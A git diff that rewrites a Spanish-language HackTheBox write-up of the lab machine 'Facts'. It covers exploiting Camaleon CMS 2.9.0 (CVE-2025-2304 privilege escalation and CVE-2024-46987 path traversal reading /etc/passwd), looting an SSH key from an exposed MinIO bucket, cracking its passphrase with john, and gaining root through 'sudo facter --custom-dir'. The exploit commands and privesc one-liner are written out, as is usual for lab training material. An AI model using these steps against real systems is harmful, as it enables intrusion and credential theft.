@@ -1,8 +1,7 @@
 ---
-title: 'Facts Writeup - HackTheBox'
+title: 'Facts - HackTheBox Writeup'
 publishDate: '2026-03-20'
-#updatedDate: '2025-07-10'
-description: 'Writeup del laboratorio Facts de HackTheBox'
+description: 'Writeup de la máquina Facts de HackTheBox'
 tags:
   - Writeup
   - HackTheBox
@@ -12,118 +11,313 @@ language: 'Spanish'
 draft: false
 ---
 
+# Facts — HackTheBox
 
-nmaps
+## Resumen
 
-![Pasted_image_20260222154656.png](Pasted_image_20260222154656.png)
-![Pasted_image_20260222154727.png](Pasted_image_20260222154727.png)
-![Pasted_image_20260222154709.png](Pasted_image_20260222154709.png)
+Máquina Linux en la que explotamos una **escalada de privilegios por asignación masiva (CVE-2025-2304)** en Camaleon CMS 2.9.0 para hacernos administradores del sitio. Desde el panel de administración obtenemos las **credenciales de un MinIO expuesto** en el puerto 54321, y un bucket que replica el sistema de archivos nos permite robar una **clave SSH cifrada**, cuya passphrase crackeamos con John the Ripper. Una **LFI autenticada (CVE-2024-46987)** nos sirve para enumerar los usuarios del sistema y saber a quién pertenece la clave. Ya dentro como `trivia`, escalamos a root abusando de `sudo` sobre el binario Ruby **`facter`** (`--custom-dir`).
 
-la web:
-![Pasted_image_20260222155712.png](Pasted_image_20260222155712.png)
-![Pasted_image_20260222155723.png](Pasted_image_20260222155723.png)
+**Flags:**
+- user.txt: `b0e8dc502ac7befa1fbbdf4b0593801cd`
+- root.txt: `f9242378c6b1e81b519012a247ca340e`
 
-el source code parece muy normal, podemos sacar algunas rutas pero poco más:
-![Pasted_image_20260222164901.png](Pasted_image_20260222164901.png)
+---
 
-gobuster --> han salido muchas rutas y archivos curiosos, vamos a ir mirando uno a uno:
-![Pasted_image_20260222165808.png](Pasted_image_20260222165808.png)
+## 1. Reconocimiento
 
-- robots
-	![Pasted_image_20260222165553.png](Pasted_image_20260222165553.png)
-- sitemap:
-	![Pasted_image_20260222165649.png](Pasted_image_20260222165649.png)
-- 
-interesante lo de admin, será un login y en función de cómo se gestione puede ser curioso de toquetear:
-![Pasted_image_20260222165309.png](Pasted_image_20260222165309.png)
-credenciales básicos no funcionan y no parece revelar información como si el usuario ya existe o no
-En el _forgot password_ pide un mail que debe estar previo registrado así que tampoco es útil.
-Creamos un usuario y accedemos a ver qué hay por detrás:
-![Pasted_image_20260222165423.png](Pasted_image_20260222165423.png)
-![Pasted_image_20260222165452.png](Pasted_image_20260222165452.png)
-buscando posibles vulns del propio cms lo que parece es que la versión no es vulnerable
-![Pasted_image_20260222165939.png](Pasted_image_20260222165939.png)
-
-continuamos revisando la página de admin, concretamente el perfil por si hubiera plugins, info de otros usuarios o podemos actualizar el role del mismo y upgradearlo
-![Pasted_image_20260222170110.png](Pasted_image_20260222170110.png)
-algo a destacar además es eso del ID, asignado y sin poder cambiarlo al 5, lo cual da que pensar que quizás existen 4 usuarios más que desconocemos
-a continuación se muestra la petición capturada con burpsuite de actualizar el nombre de usuario de 'test' a 'test1' --> vamos a probar a añadir el campo rol y asignarle admin a ver si funciona e investigaremos también la ruta a ver si desvelamos otros usuarios o podemos cambiar algo de otros o lo que sea.
-![Pasted_image_20260222170516.png](Pasted_image_20260222170516.png)
-Vale, el tema de añadir el campo rol a la petición no funciona, he probado también a cambiar método por ver si podía obtener otros usuarios y se ve que tampoco.
-He creado un nuevo usuario para ver si el ID cambiaba y realmente era determinante del número de usuarios existente:
-![Pasted_image_20260223165711.png](Pasted_image_20260223165711.png)
-por curiosidad busqué posibles vulnerabilidades sobre el CMS en la versión que tenemos y encontré lo siguiente --> https://medium.com/@iamkumarraj/mass-assignment-vulnerability-in-camaleon-cms-2-9-0-ajax-privilege-escalation-9a09c8253b52 --> https://github.com/CsuriBird/CVE-2025-2304/tree/main. La posibilidad de escalar privilegios por una vulnerabilidad de AJAX, lo cual tiene sentido puesto que en gobuster salían rutas relacionadas con ajax, así que vamos a probar:
-![Pasted_image_20260223165917.png](Pasted_image_20260223165917.png)
-![Pasted_image_20260223170209.png](Pasted_image_20260223170209.png)
-![Pasted_image_20260223170239.png](Pasted_image_20260223170239.png)
-tal y como podemos comprobar el script ha funcionado para el usuario test1 que habíamos creado, ahora es administrador.
-ahora vamos a investigar un poco todo lo nuevo desbloqueado:
-![Pasted_image_20260223170426.png](Pasted_image_20260223170426.png)
-![Pasted_image_20260223170500.png](Pasted_image_20260223170500.png)
-![Pasted_image_20260223170515.png](Pasted_image_20260223170515.png)
-![Pasted_image_20260223173416.png](Pasted_image_20260223173416.png)
-![Pasted_image_20260223173426.png](Pasted_image_20260223173426.png)
-![Pasted_image_20260223173458.png](Pasted_image_20260223173458.png)
-no interpreta php, ni python que he probado también con otro archivo, así que viendo que la página tira de ruby vamos a probar con una reverse shell en este lenguaje:
-![Pasted_image_20260223173351.png](Pasted_image_20260223173351.png)
-![Pasted_image_20260223173637.png](Pasted_image_20260223173637.png)
-vale, he probado con awscli y a subir archivos con eso y pasa lo mismo que con el upload de la página de media del panel de admin
-https://github.com/vidura2/CVE-2024-46986 --> he probado esto y no parece funcionar tampoco 
-he probado también a añadir una reverse shell de ruby en el contenido de alguna página por si lo procesaba pero lo pilla como texto plano
-
-![Pasted_image_20260224131233.png](Pasted_image_20260224131233.png)
-![Pasted_image_20260224130823.png](Pasted_image_20260224130823.png)
-![Pasted_image_20260224130834.png](Pasted_image_20260224130834.png)
-![Pasted_image_20260224130916.png](Pasted_image_20260224130916.png)
-![Pasted_image_20260224130935.png](Pasted_image_20260224130935.png)
-![Pasted_image_20260224130942.png](Pasted_image_20260224130942.png)
-![Pasted_image_20260224131039.png](Pasted_image_20260224131039.png)
-![Pasted_image_20260224130757.png](Pasted_image_20260224130757.png)
-![Pasted_image_20260224131420.png](Pasted_image_20260224131420.png)
-![Pasted_image_20260224133955.png](Pasted_image_20260224133955.png)
-![Pasted_image_20260224134015.png](Pasted_image_20260224134015.png)
-
-
-retomando la máquina vamos de nuevo con el script que estábamos probando para ejecución de comandos en camaleon cms, que en teoría era para otra versión pero por si acaso:
-![Pasted_image_20260319174241.png](Pasted_image_20260319174241.png)
-no parece funcionar, así que vamos a seguir buscando posibles vulnerabilidades
-buscando en google bastante a fondo y admito que mirando un poco la solución puesto que lo que habíamos probado antes era lo que primero salía que era el CVE-2024-46986 y ya vimos que no funcionaba encontramos esto:
-![Pasted_image_20260319174505.png](Pasted_image_20260319174505.png)
-![Pasted_image_20260319174322.png](Pasted_image_20260319174322.png)
-con este script parece que podemos leer archivos del internos del servidor así que si sacamos el /etc/passwd podemos averiguar los usuarios que existen y probar entonces la clave por ssh.
-![Pasted_image_20260319174718.png](Pasted_image_20260319174718.png)
-descargamos entonces la clave, le asignamos los permisos necesarios y probamos con el primer usuario y efectivamente conseguimos la sesión ssh:
-![Pasted_image_20260319174755.png](Pasted_image_20260319174755.png)
-
-vale ahora donde está la flag y, ¿podemos verla? o tendremos que migrar de user?
-buscando un poco vemos que estaba en el home del otro user y podemos verla
-![Pasted_image_20260319180305.png](Pasted_image_20260319180305.png)
-
-ahora queda escalar privilegios y lo primero a probar es lo típico, podemos hacer algo de sudo o SUID???
-![Pasted_image_20260319180143.png](Pasted_image_20260319180143.png)
-parece que sí, cómo funciona este comando?
-![Pasted_image_20260319180418.png](Pasted_image_20260319180418.png)
-
-Al buscar información sobre este binario en GTFOBins, se observa que `facter` permite el uso del parámetro `--custom-dir`. Este parámetro hace que el programa cargue “custom facts”, es decir, scripts Ruby desde un directorio que le indiquemos. Lo importante aquí es que `facter` ejecuta el primer archivo `.rb` que encuentra en ese directorio.
-
-La idea de la explotación es bastante directa: si podemos controlar ese directorio, podemos introducir nuestro propio script malicioso en Ruby. Como `facter` se va a ejecutar con `sudo`, ese script también se ejecutará con privilegios de root.
-
-El proceso sería así:
-1. Crear un directorio controlado por nosotros (por ejemplo en `/tmp`).
-2. Dentro de ese directorio, crear un archivo Ruby con código que abra una shell.
-3. Ejecutar `facter` como root usando `sudo` y apuntando al directorio que hemos creado con `--custom-dir`.
-
-Un ejemplo sencillo de script Ruby sería:
-
-```ruby
-exec("/bin/bash")
-```
-
-Al ejecutar:
+Comenzamos con un escaneo completo de puertos:
 
 ```bash
+sudo nmap -p- -sS --min-rate=5000 -vvv -n -Pn 10.129.2.107 -oG allPorts
+```
+
+{/* ![Escaneo completo de puertos](./images/nmap_allports.png) */}
+
+Los puertos abiertos son el **22 (SSH)**, el **80 (HTTP)** y el **54321 (desconocido)**. El escaneo de versiones revela:
+
+```bash
+sudo nmap -p22,80,54321 -sCV 10.129.2.107 -oN targeted
+```
+
+{/* ![Escaneo de versiones](./images/nmap_versions.png) */}
+
+- **22/tcp** — OpenSSH 9.9p1 (Ubuntu)
+- **80/tcp** — nginx 1.26.3, que redirige a `http://facts.htb/`
+- **54321/tcp** — servidor HTTP en Golang que nmap identifica como **MinIO**, con el curioso mensaje de fingerprint `/nice ports,/Trinity.txt.bak`
+
+Añadimos el dominio al `/etc/hosts`:
+
+```bash
+echo -n "10.129.2.107 facts.htb" | sudo tee -a /etc/hosts
+```
+
+{/* ![Añadiendo facts.htb a /etc/hosts](./images/etc_hosts.png) */}
+
+## 2. Enumeración web
+
+La web principal es una página de curiosidades y trivia:
+
+{/* ![Página principal](./images/web_home.png) */}
+
+  {/* ![Pie de página](./images/web_footer.png) */}
+
+El código fuente parece normal, pero revela algunas rutas y que el tema del sitio es **camaleon**:
+
+{/* ![Código fuente](./images/source_code.png) */}
+
+Lanzamos **gobuster** y salen bastantes rutas y archivos curiosos, que iremos revisando uno a uno:
+
+```bash
+gobuster dir -u http://facts.htb -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 50 -x php,py,java,js,txt -b 404
+```
+
+{/* ![Resultado de gobuster](./images/gobuster.png) */}
+
+- `robots.txt` solo apunta al sitemap:
+
+{/* ![robots.txt](./images/robots.png) */}
+
+- El `sitemap` lista las entradas del sitio:
+
+{/* ![sitemap.xml](./images/sitemap.png) */}
+
+- Lo más interesante es `/admin`, que redirige a un **login** (`/admin/login`). Será cuestión de ver cómo gestiona la autenticación:
+
+{/* ![Login de administración](./images/admin_login.png) */}
+
+Las credenciales básicas no funcionan y el formulario no revela información (no se puede enumerar usuarios válidos). En el *forgot password* pide un correo previamente registrado, así que tampoco es útil.
+
+## 3. Registro y primeros pasos en Camaleon CMS
+
+Creamos un usuario (`test`) y accedemos para ver qué hay detrás:
+
+{/* ![Registro de usuario](./images/register.png) */}
+
+{/* ![Panel de administración](./images/admin_panel.png) */}
+
+El panel nos confirma el CMS: **Camaleon CMS v2.9.0**. Buscamos vulnerabilidades conocidas de la versión, pero `searchsploit` solo muestra un XSS (2.4) y un SSTI (2.7.0), nada aplicable:
+
+{/* ![searchsploit camaleon](./images/searchsploit.png) */}
+
+Seguimos revisando el panel, concretamente el **perfil**, por si hubiera plugins, información de otros usuarios o alguna forma de modificar el rol:
+
+{/* ![Edición de perfil](./images/profile_id5.png) */}
+
+Algo llamativo: el campo **ID** es el **5** y no se puede cambiar, lo que sugiere que existen **cuatro usuarios anteriores** que desconocemos.
+
+Capturamos con **Burp Suite** la petición de actualización del perfil (`PATCH /admin/users/5`) para probar a añadir el campo `role` con valor `admin` (mass assignment). No funciona, y tampoco obtenemos nada cambiando el método HTTP para intentar leer otros usuarios:
+
+{/* ![Petición PATCH capturada en Burp](./images/burp_patch.png) */}
+
+Creamos un segundo usuario (`test1`) para comprobar si el ID cambiaba y confirmar cuántos usuarios existen:
+
+{/* ![Nuevo usuario test1](./images/test1_profile.png) */}
+
+## 4. CVE-2025-2304 — Escalada de privilegios por AJAX
+
+Buscando vulnerabilidades del CMS en la versión que corre, encontramos el siguiente artículo y su PoC:
+
+- [Mass Assignment Vulnerability in Camaleon CMS 2.9.0 - AJAX Privilege Escalation](https://medium.com/@iamkumarraj/mass-assignment-vulnerability-in-camaleon-cms-2-9-0-ajax-privilege-escalation-9a09c8253b52)
+- [https://github.com/CsuriBird/CVE-2025-2304](https://github.com/CsuriBird/CVE-2025-2304)
+
+La posibilidad de escalar privilegios por una vulnerabilidad de **AJAX** encaja con las rutas relacionadas con ajax que aparecían en gobuster. Clonamos el repositorio e instalamos dependencias:
+
+{/* ![Clonando el exploit CVE-2025-2304](./images/clone_cve_2025_2304.png) */}
+
+Ejecutamos el exploit contra nuestro usuario `test1`:
+
+```bash
+python camaleon_cms_privilege_escalation.py --url http://facts.htb --username test1 --password test1
+```
+
+{/* ![Exploit ejecutado con éxito](./images/exploit_2025_2304.png) */}
+
+El script funciona: `test1` ahora es **Administrator**. Al entrar de nuevo lo confirmamos, y vemos el menú completo desbloqueado (Contents, Media, Comments, Appearance, Plugins, Users, Settings):
+
+{/* ![Rol Administrator confirmado](./images/admin_role.png) */}
+
+## 5. Intentos de ejecución remota de comandos (primeros intentos)
+
+Con el panel de administración intentamos conseguir ejecución remota de comandos.
+
+En **Users** ya vemos todos los usuarios del CMS (`admin` y `test1`):
+
+{/* ![Listado de usuarios](./images/list_users.png) */}
+
+En **Plugins** hay 4 activos (Attack, Front Cache, Contact Form, Cama Meta Tags) y 2 desactivados (Authoring Posts, Visibility Posts):
+
+{/* ![Plugins activos](./images/plugins_active.png) */}
+
+{/* ![Plugins desactivados](./images/plugins_disabled.png) */}
+
+Probamos con **Media → Upload File**, subiendo una `php-reverse-shell.php`:
+
+{/* ![Subida de la reverse shell PHP](./images/media_upload.png) */}
+
+El archivo se sube correctamente a `http://facts.htb/randomfacts/php-reverse-shell.php`:
+
+{/* ![Archivo PHP subido](./images/php_uploaded.png) */}
+
+Pero al visitarlo **se descarga en lugar de ejecutarse**: el servidor no interpreta PHP (tampoco interpretó un archivo Python que probamos):
+
+{/* ![El PHP se descarga, no se ejecuta](./images/php_download.png) */}
+
+Como la aplicación está escrita en **Ruby on Rails**, probamos con una reverse shell en Ruby ([rshell.rb](https://gist.github.com/gr33n7007h)):
+
+{/* ![Reverse shell en Ruby](./images/rshell_ruby.png) */}
+
+La subimos como `revshell.rb` y ocurre lo mismo: el servidor la sirve como archivo estático sin interpretarla:
+
+{/* ![revshell.rb subida](./images/rshell_uploaded.png) */}
+
+Otros intentos fallidos por este camino:
+- Subir archivos con **awscli** directamente al bucket → mismo comportamiento.
+- [CVE-2024-46986](https://github.com/vidura2/CVE-2024-46986) → no funciona.
+- Añadir código Ruby en el contenido de una página → se renderiza como texto plano.
+
+## 6. MinIO: credenciales S3 en la configuración del sitio
+
+Revisando **Settings → Filesystem Settings** encontramos la sección **"Save files in aws s3"** activada, con:
+- **AWS Access Key / Secret Key**
+- Bucket: `randomfacts`, región `us-east-1`
+- **Endpoint: `http://localhost:54321`** ← el puerto 54321 que nmap identificó como **MinIO**
+
+{/* ![Filesystem Settings con credenciales S3](./images/filesystem_settings.png) */}
+
+Configuramos un perfil de **awscli** con esas credenciales apuntando al endpoint externo y listamos los buckets:
+
+```bash
+aws configure --profile facts2
+aws --endpoint-url http://10.129.3.174:54321 s3 ls --profile facts2
+```
+
+{/* ![Configuración de awscli y listado de buckets](./images/aws_ls_buckets.png) */}
+
+Hay dos buckets: `internal` y `randomfacts`. Listando `internal` de forma recursiva descubrimos que contiene una **copia casi completa del sistema de archivos** de la máquina (cachés de bundler, `.bashrc`, `.profile`... y, lo importante, `.ssh/authorized_keys` y `.ssh/id_ed25519`):
+
+{/* ![Listado recursivo del bucket internal](./images/aws_recursive.png) */}
+
+{/* ![Archivos .ssh en el bucket](./images/aws_ssh_listing.png) */}
+
+Descargamos la clave pública y la privada:
+
+{/* ![Descarga de authorized_keys](./images/aws_cp_authorized_keys.png) */}
+
+{/* ![authorized_keys](./images/authorized_keys.png) */}
+
+{/* ![Descarga de id_ed25519](./images/aws_cp_id_ed25519.png) */}
+
+La clave privada está cifrada con passphrase, así que la convertimos con `ssh2john` y la crackeamos con **rockyou**:
+
+```bash
+ssh2john id_ed25519 > id_hash.txt
+john --wordlist=/usr/share/wordlists/rockyou.txt id_hash.txt
+john --show id_hash.txt
+```
+
+{/* ![Passphrase crackeada: dragonballz](./images/john_crack.png) */}
+
+Passphrase: **`dragonballz`**.
+
+Intentamos conectar como root con la clave, pero no funciona (la clave no está autorizada para root):
+
+```bash
+chmod 600 id_ed25519
+ssh -i id_ed25519 root@10.129.3.174
+# Permission denied
+```
+
+{/* ![Acceso root denegado](./images/ssh_root_denied.png) */}
+
+Pregunta clave: **¿a qué usuario pertenece esta clave?** Exploramos más archivos del bucket (`.bashrc`, versiones de gems de Ruby...) sin encontrar la respuesta:
+
+{/* ![Leyendo .bashrc del bucket](./images/aws_bashrc.png) */}
+
+{/* ![Versiones de gems](./images/aws_gems.png) */}
+
+## 7. CVE-2024-46987 — Path Traversal autenticado
+
+Retomamos la máquina (la instancia se había reiniciado, con nueva IP) y probamos de nuevo el script de ejecución de comandos para Camaleon CMS (CVE-2024-46986, pensado para otra versión, pero por si acaso). No funciona:
+
+{/* ![Reintento de CVE-2024-46986](./images/cve_2024_46986.png) */}
+
+Buscando más a fondo (y admito que mirando un poco la solución, ya que lo que habíamos probado antes era lo primero que salía, el CVE-2024-46986), encontramos el **CVE-2024-46987**: un **Path Traversal** autenticado en Camaleon CMS 2.8.0 < 2.8.2 que **también funciona en 2.9.0**, permitiendo leer archivos arbitrarios del servidor:
+
+{/* ![Clonando CVE-2024-46987](./images/clone_cve_2024_46987.png) */}
+
+{/* ![Descripción del CVE-2024-46987](./images/github_cve_2024_46987.png) */}
+
+Lo usamos para leer `/etc/passwd` y descubrir los usuarios del sistema:
+
+```bash
+python CVE-2024-46987.py -u http://facts.htb -l test -p test /etc/passwd
+```
+
+{/* ![/etc/passwd leído](./images/etc_passwd.png) */}
+
+Los usuarios con shell son **`trivia`** (uid 1000) y **`william`** (uid 1001).
+
+## 8. Acceso inicial por SSH
+
+Repetimos la descarga de la clave desde el bucket `internal` (la máquina se reinició, pero el bucket sigue ahí) y probamos con el primer usuario:
+
+```bash
+aws --endpoint-url http://facts.htb:54321 s3 cp s3://internal/.ssh/id_ed25519 . --profile facts
+chmod 600 id_ed25519
+ssh -i id_ed25519 trivia@10.129.13.13
+# passphrase: dragonballz
+```
+
+¡Conseguimos sesión SSH como **trivia**!
+
+{/* ![Sesión SSH como trivia](./images/ssh_trivia.png) */}
+
+## 9. Flag de usuario
+
+Buscamos la flag. Está en el home del otro usuario (`william`), pero curiosamente **es legible** para nosotros:
+
+{/* ![Lectura de user.txt](./images/user_flag.png) */}
+
+`b0e8dc502ac7befa1fbbdf4b0593801cd`
+
+## 10. Escalada de privilegios: sudo facter → root
+
+Lo primero es lo de siempre: `sudo -l` y binarios SUID. Vemos que podemos ejecutar **`facter`** como root sin contraseña:
+
+{/* ![sudo -l](./images/sudo_l.png) */}
+
+Vemos que `facter` es un binario escrito en **Ruby**:
+
+{/* ![facter es un script Ruby](./images/facter_ruby.png) */}
+
+Al buscar información sobre este binario en **GTFOBins**, se observa que `facter` permite el uso del parámetro **`--custom-dir`**. Este parámetro hace que el programa cargue "custom facts", es decir, **scripts Ruby desde un directorio que le indiquemos**. Lo importante es que `facter` ejecuta el primer archivo `.rb` que encuentra en ese directorio.
+
+La idea es directa: si controlamos el directorio, introducimos nuestro propio script malicioso en Ruby y, como `facter` se ejecuta con `sudo`, el script correrá como **root**:
+
+```bash
+cd /tmp
+echo 'exec "/bin/sh"' > shell.rb
 sudo facter --custom-dir /tmp
 ```
 
-`facter` cargará el script desde ese directorio y lo ejecutará como root, lo que nos dará una shell con privilegios elevados.
-![Pasted_image_20260319180758.png](Pasted_image_20260319180758.png)
+{/* ![Shell como root](./images/root.png) */}
+
+Ya somos root, y leemos la flag:
+
+`f9242378c6b1e81b519012a247ca340e`
+
+---
+
+## Resumen de vectores
+
+| Fase | Técnica |
+|---|---|
+| Reconocimiento | nmap: SSH (22), nginx (80), **MinIO (54321)** |
+| Web | Gobuster, robots.txt, sitemap → `/admin` (Camaleon CMS **2.9.0**) |
+| Privesc en CMS | **CVE-2025-2304** — Mass Assignment / AJAX → administrador |
+| Credenciales | AWS keys expuestas en *Settings → Filesystem Settings* |
+| Exfiltración | Bucket `internal` de MinIO = copia del filesystem → robo de `id_ed25519` |
+| Cracking | `ssh2john` + `john` (rockyou) → passphrase `dragonballz` |
+| Enumeración | **CVE-2024-46987** — Path Traversal → `/etc/passwd` (usuarios `trivia`, `william`) |
+| Acceso inicial | SSH con la clave robada como `trivia` |
+| Escalada de privilegios | `sudo facter` + `--custom-dir` (GTFOBins) → root |
